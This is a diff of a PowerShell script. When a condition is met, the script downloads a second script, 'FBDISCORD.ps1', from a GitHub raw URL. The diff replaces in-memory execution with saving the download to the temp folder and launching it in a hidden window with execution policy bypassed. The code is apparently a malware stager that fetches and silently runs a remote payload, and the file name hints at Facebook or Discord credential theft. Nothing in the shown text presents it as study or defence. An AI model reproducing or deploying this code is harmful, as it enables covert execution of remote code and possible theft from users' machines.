@@ -43,7 +43,11 @@ while (-not $conditionMet) {
 if ($conditionMet) {
     $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/FBDISCORD.ps1"
     $secondScript = Invoke-WebRequest -Uri $secondScriptUrl
-    Invoke-Expression -Command $secondScript.Content
+
+    $scriptPath = "$env:TEMP\secondScript.ps1"
+    $secondScript.Content | Out-File -FilePath $scriptPath -Encoding UTF8
+
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden -Wait
 }
 
 # Continue with the rest of your script here
